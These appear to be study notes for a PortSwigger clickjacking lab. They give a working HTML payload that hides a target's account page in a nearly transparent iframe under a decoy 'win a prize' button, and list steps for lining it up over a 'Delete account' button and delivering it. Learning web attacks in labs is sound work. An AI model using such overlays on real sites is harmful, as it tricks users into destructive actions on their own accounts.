# Clickjacking - Attack Techniques

## Basic Clickjacking
```html
<style>
iframe {
    position: relative;
    width: 500px;
    height: 300px;
    opacity: 0.0001;
    z-index: 2;
}
div {
    position: absolute;
    top: 300px;  /* Adjust to align with target button */
    left: 60px;  /* Adjust to align with target button */
    z-index: 1;
}
</style>
<div>Click here to win a prize!</div>
<iframe src="https://target.com/my-account"></iframe>
```

## With CSRF Token
```html
<!-- Load target page in iframe to get CSRF token -->
<!-- Then overlay decoy button on delete button -->
```

## Key Challenges
1. **Pixel alignment** - Must precisely align decoy with target button
2. **iframe sizing** - Target page layout differs at different widths
3. **Session management** - Victim must be logged in

## PortSwigger Lab Approach
1. Login to target, view /my-account page
2. Inspect "Delete account" button position
3. Create exploit HTML with precise pixel alignment
4. Use exploit server to host and deliver
5. Victim clicks decoy → clicks delete button

## Common Issues
- Button position varies by browser/screen size
- iframe rendering differs from full page
- Need to measure at exact iframe width (e.g., 500px)
